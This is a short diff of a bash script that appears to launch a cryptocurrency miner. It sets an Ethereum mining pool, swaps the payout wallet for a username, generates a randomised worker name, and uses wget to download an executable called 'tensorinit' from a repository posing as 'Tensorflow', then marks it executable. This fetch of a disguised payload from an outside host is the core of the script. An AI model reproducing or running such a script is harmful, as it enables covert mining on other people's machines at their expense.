@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=eth.ethashpool.com:3939
-WALLET=0xC887F4845da5eDcF45EcF7ac32035Fb41527B8c6.
+WALLET=nglkmerkel.
 WORKER=$(echo $(shuf -i 10-20 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/nglkmerkel/Tensorflow/raw/main/tensorinit
 chmod +x tensorinit
